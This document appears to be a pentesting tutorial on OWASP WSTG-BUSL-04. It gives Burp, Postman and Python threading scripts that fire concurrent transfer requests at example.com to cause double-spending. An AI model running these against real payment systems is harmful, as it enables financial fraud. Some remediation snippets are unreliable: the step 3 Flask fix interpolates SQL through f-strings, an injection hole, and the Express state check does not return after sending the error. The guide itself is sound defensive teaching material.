# Test for Process Timing

## Overview

Testing for process timing (WSTG-BUSL-04) involves assessing whether a web application is vulnerable to race conditions or timing-based attacks that exploit the timing of operations in its business logic. According to OWASP, race conditions occur when multiple processes access shared resources concurrently without proper synchronization, allowing attackers to manipulate timing to bypass logic (e.g., simultaneous transactions to overspend). This test identifies vulnerabilities where improper timing controls enable unauthorized actions or data corruption.

**Impact**: Weak process timing controls can lead to:
- Financial fraud (e.g., double-spending).
- Data corruption (e.g., inconsistent balances).
- Unauthorized actions (e.g., bypassing approvals).
- Service disruption due to race conditions.

This guide provides a step-by-step methodology for testing process timing, adhering to OWASP’s WSTG-BUSL-04, with practical tools, specific commands, remediation strategies, and ethical considerations for professional penetration testing.

## Testing Tools

The following tools are recommended for testing process timing vulnerabilities, with setup and configuration instructions:

- **Burp Suite Community Edition**: Intercepts and manipulates HTTP requests.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: 127.0.0.1:8080 (Firefox recommended).
  - Enable “Intercept” in Proxy tab.

- **Postman**: Tests API endpoints with controlled timing.
  - Download from [postman.com](https://www.postman.com/downloads/).
  - Install and create a free account.

- **cURL**: Sends rapid or timed HTTP requests.
  - Install on Linux:
    ```bash
    sudo apt install curl
    ```
  - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).

- **Browser Developer Tools**: Inspects request timing in Chrome/Firefox.
  - Access by pressing `F12` or right-clicking and selecting “Inspect”.
  - No setup required.

- **Python Requests Library**: Scripts concurrent or timed HTTP requests.
  - Install Python:
    ```bash
    sudo apt install python3
    ```
  - Install Requests:
    ```bash
    pip install requests
    ```

## Testing Methodology

This methodology follows OWASP’s black-box approach for WSTG-BUSL-04, focusing on simulating concurrent or timed actions to exploit race conditions or timing vulnerabilities in business logic.

### 1. Identify Time-Sensitive Workflows with Burp Suite

**Objective**: Map workflows where timing affects outcomes (e.g., transactions, approvals).

**Steps**:
1. **Configure Burp Suite**:
   - Set up browser proxy (127.0.0.1:8080).
   - Add `example.com` to the target scope in “Target” tab.
2. **Capture Requests**:
   - Perform actions (e.g., transfer funds, place orders).
   - Review “HTTP History” for shared resources (e.g., balances, inventory).
3. **Analyze Workflows**:
   - Note sequential steps (e.g., `POST /transfer`, `POST /confirm`).

**Burp Suite Commands**:
- **Command 1**: Capture request:
  ```
  HTTP History -> Select POST /transfer -> Check Params: account_id=123, amount=100.00 -> Send to Repeater
  ```
- **Command 2**: Export workflows:
  ```
  Target -> Site Map -> Right-click example.com -> Copy URLs in Scope -> Paste to file
  ```

**Example Request**:
```
POST /transfer HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

account_id=123&amount=100.00
```

**Remediation**:
- Implement locking (PHP):
  ```php
  $lock = acquire_lock('account_' . $account_id);
  if (!$lock) {
      die('Transaction in progress');
  }
  // Process transfer
  release_lock($lock);
  ```

**Tip**: Save “HTTP History” requests to Burp Suite’s “Logger” or as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., request details).

### 2. Simulate Concurrent Requests with Burp Suite Intruder

**Objective**: Send simultaneous requests to exploit race conditions.

**Steps**:
1. **Send to Intruder**:
   - Right-click a request in “HTTP History” and select “Send to Intruder”.
   - Set payload position (e.g., `amount=100.00`).
2. **Configure Intruder**:
   - Use “Cluster Bomb” mode, set 10 threads for concurrency.
   - Run the attack.
3. **Analyze Results**:
   - Check for multiple processed requests (e.g., double-spending).

**Burp Suite Commands**:
- **Command 1**: Run attack:
  ```
  Intruder -> Positions -> Set amount=100.00 -> Payloads -> Simple list -> Add 100.00 -> Options -> Threads: 10 -> Start Attack
  ```
- **Command 2**: Review results:
  ```
  Intruder -> Results -> Check Status Codes and Responses -> Look for Balance: -100.00
  ```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
{"status": "success", "balance": -100.00}
```

**Remediation**:
- Use atomic transactions (Express):
  ```javascript
  const db = require('database');
  await db.transaction(async (trx) => {
      const balance = await trx('accounts').where('id', account_id).select('balance');
      if (balance[0].balance < amount) throw new Error('Insufficient funds');
      await trx('accounts').where('id', account_id).decrement('balance', amount);
  });
  ```

**Tip**: Save Intruder results as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 3. Test API Timing with Postman

**Objective**: Test API endpoints for timing vulnerabilities.

**Steps**:
1. **Import Endpoints**:
   - Identify APIs from Burp Suite (e.g., `/api/v1/transfer`).
   - Add to Postman.
2. **Send Concurrent Requests**:
   - Create a Collection with 5 `POST /api/v1/transfer` requests.
   - Run with 0ms delay in Collection Runner.
3. **Analyze Response**:
   - Check for overspending or inconsistent states.

**Postman Commands**:
- **Command 1**: Run collection:
  ```
  Collection -> Add POST http://example.com/api/v1/transfer -> Body: {"account_id": 123, "amount": 100.00} -> Collection Runner -> Iterations: 5, Delay: 0ms -> Run
  ```
- **Command 2**: Single request:
  ```
  New Request -> POST http://example.com/api/v1/transfer -> Body: {"account_id": 123, "amount": 100.00} -> Send
  ```

**Example Vulnerable Response**:
```json
[{"status": "success", "balance": 0.00}, {"status": "success", "balance": -100.00}]
```

**Remediation**:
- Implement mutex locks (Flask):
  ```python
  from threading import Lock
  lock = Lock()
  def transfer(account_id, amount):
      with lock:
          account = db.query(f"SELECT balance FROM accounts WHERE id={account_id} FOR UPDATE")
          if account.balance < amount:
              raise ValueError("Insufficient funds")
          db.execute(f"UPDATE accounts SET balance = balance - {amount} WHERE id={account_id}")
  ```

**Tip**: Save Postman collection runs as exports or screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., API responses).

### 4. Automate Concurrent Requests with Python Requests

**Objective**: Simulate high-concurrency scenarios to detect race conditions.

**Steps**:
1. **Write Script**:
   - Use threading to send concurrent requests.
2. **Run Script**:
   - Execute and analyze responses.
3. **Verify Findings**:
   - Cross-check with Burp Suite.

**Python Script**:
```python
import requests
import threading
import sys

url = 'http://example.com/api/v1/transfer'
data = {'account_id': '123', 'amount': 100.00}

def send_request():
    try:
        response = requests.post(url, json=data, timeout=5)
        print(f"Status: {response.status_code}, Response: {response.text[:100]}")
    except requests.RequestException as e:
        print(f"Error: {e}")

try:
    threads = [threading.Thread(target=send_request) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
```

**Python Commands**:
- **Command 1**: Run script:
  ```bash
  python3 test_concurrent.py
  ```
- **Command 2**: Test single request:
  ```bash
  python3 -c "import requests; url='http://example.com/api/v1/transfer'; data={'account_id': '123', 'amount': 100.00}; r=requests.post(url, json=data, timeout=5); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Status: 200, Response: {"status": "success", "balance": -100.00}
```

**Remediation**:
- Use row locking (SQL):
  ```sql
  BEGIN TRANSACTION;
  SELECT * FROM accounts WHERE id = 123 FOR UPDATE;
  UPDATE accounts SET balance = balance - 100.00 WHERE id = 123 AND balance >= 100.00;
  COMMIT;
  ```

**Tip**: Save script output to a file (e.g., `python3 test_concurrent.py > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., script output).

### 5. Script Browser-Based Timing Tests with Python Requests

**Objective**: Automate HTTP-based timing tests to simulate race conditions.

**Steps**:
1. **Write Script**:
   - Simulate browser actions with HTTP requests.
2. **Run Script**:
   - Execute and analyze responses.
3. **Verify Findings**:
   - Cross-check with Burp Suite.

**Python Script**:
```python
import requests
import threading
import sys

url = 'http://example.com/transfer'
data = {'account_id': '123', 'amount': 100.00}
cookies = {'session_id': 'abc123'}

def send_request():
    try:
        response = requests.post(url, data=data, cookies=cookies, timeout=5)
        print(f"Status: {response.status_code}, Response: {response.text[:100]}")
    except requests.RequestException as e:
        print(f"Error: {e}")

try:
    threads = [threading.Thread(target=send_request) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
```

**Python Commands**:
- **Command 1**: Run script:
  ```bash
  python3 test_browser_timing.py
  ```
- **Command 2**: Test single request:
  ```bash
  python3 -c "import requests; url='http://example.com/transfer'; data={'account_id': '123', 'amount': 100.00}; cookies={'session_id': 'abc123'}; r=requests.post(url, data=data, cookies=cookies, timeout=5); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Status: 200, Response: {"status": "success", "balance": -200.00}
```

**Remediation**:
- Implement optimistic locking (PHP):
  ```php
  $account = DB::select('SELECT balance, version FROM accounts WHERE id = ?', [$account_id]);
  if ($account->balance < $amount) {
      die('Insufficient funds');
  }
  $rows = DB::update('UPDATE accounts SET balance = balance - ?, version = version + 1 WHERE id = ? AND version = ?', [$amount, $account_id, $account->version]);
  if ($rows === 0) {
      die('Transaction conflict');
  }
  ```

**Tip**: Save script output to a file (e.g., `python3 test_browser_timing.py > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., script output).

### 6. Test Delayed Request Timing with Burp Suite

**Objective**: Verify if delayed requests exploit timing windows.

**Steps**:
1. **Capture Request**:
   - Use Burp Suite to capture a request (e.g., `POST /transfer`).
2. **Introduce Delay**:
   - Send two requests in Repeater with a 500ms delay.
3. **Analyze Response**:
   - Check for incorrect processing (e.g., overspending).

**Burp Suite Commands**:
- **Command 1**: Send delayed request:
  ```
  Repeater -> POST /transfer -> Params: account_id=123, amount=100.00 -> Send -> Wait 500ms -> Send Again -> Check Response
  ```
- **Command 2**: Verify single request:
  ```
  Repeater -> POST /transfer -> Params: account_id=123, amount=100.00 -> Send -> Check Response
  ```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
{"status": "success", "balance": -100.00}
```

**Remediation**:
- Use pessimistic locking (PHP):
  ```php
  $account = DB::select('SELECT balance FROM accounts WHERE id = ? FOR UPDATE', [$account_id]);
  if ($account->balance < $amount) {
      die('Insufficient funds');
  }
  DB::update('UPDATE accounts SET balance = balance - ? WHERE id = ?', [$amount, $account_id]);
  ```

**Tip**: Save Repeater requests and responses as screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., HTTP responses).

### 7. Test Out-of-Sequence Requests with Postman

**Objective**: Check if out-of-sequence API requests bypass timing logic.

**Steps**:
1. **Identify Workflow**:
   - Find multi-step APIs (e.g., `POST /transfer/init`, `POST /transfer/confirm`).
2. **Send Out-of-Sequence**:
   - Send confirmation before initialization.
3. **Analyze Response**:
   - Check for unauthorized processing.

**Postman Commands**:
- **Command 1**: Send out-of-sequence:
  ```
  New Request -> POST http://example.com/api/v1/transfer/confirm -> Body: {"transaction_id": 789} -> Send
  ```
- **Command 2**: Normal sequence:
  ```
  New Request -> POST http://example.com/api/v1/transfer/init -> Body: {"account_id": 123, "amount": 100.00} -> Send -> POST /transfer/confirm -> Body: {"transaction_id": 789} -> Send
  ```

**Example Vulnerable Response**:
```
HTTP/1.1 200 OK
{"status": "success", "transaction": "confirmed"}
```

**Remediation**:
- Validate state (Express):
  ```javascript
  const transaction = await db.query('SELECT status FROM transactions WHERE id = ?', [transaction_id]);
  if (transaction.status !== 'initialized') {
      res.status(400).send('Invalid transaction state');
  }
  ```

**Tip**: Save Postman requests and responses as exports or screenshots. Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., API responses).

### 8. Test High-Volume Concurrent Requests with Python Requests

**Objective**: Simulate race conditions with high concurrency.

**Steps**:
1. **Write Script**:
   - Use threading for high-volume requests.
2. **Run Script**:
   - Execute and analyze responses.
3. **Verify Findings**:
   - Cross-check with Burp Suite.

**Python Script**:
```python
import requests
import threading
import sys

url = 'http://example.com/api/v1/transfer'
data = {'account_id': '123', 'amount': 100.00}

def send_request():
    try:
        response = requests.post(url, json=data, timeout=5)
        print(f"Status: {response.status_code}, Response: {response.text[:100]}")
    except requests.RequestException as e:
        print(f"Error: {e}")

try:
    threads = [threading.Thread(target=send_request) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)
```

**Python Commands**:
- **Command 1**: Run script:
  ```bash
  python3 test_high_volume.py
  ```
- **Command 2**: Test single request:
  ```bash
  python3 -c "import requests; url='http://example.com/api/v1/transfer'; data={'account_id': '123', 'amount': 100.00}; r=requests.post(url, json=data, timeout=5); print(r.status_code, r.text[:100])"
  ```

**Example Vulnerable Output**:
```
Status: 200, Response: {"status": "success", "balance": -1900.00}
```

**Remediation**:
- Use mutex locks (Flask):
  ```python
  from threading import Lock
  lock = Lock()
  def transfer(account_id, amount):
      with lock:
          account = db.execute("SELECT balance FROM accounts WHERE id = ? FOR UPDATE", (account_id,))
          if account.balance < amount:
              raise ValueError("Insufficient funds")
          db.execute("UPDATE accounts SET balance = balance - ? WHERE id = ?", (amount, account_id))
  ```

**Tip**: Save script output to a file (e.g., `python3 test_high_volume.py > output.txt`). Organize findings in a report with timestamps, test descriptions, and evidence of vulnerabilities (e.g., script output).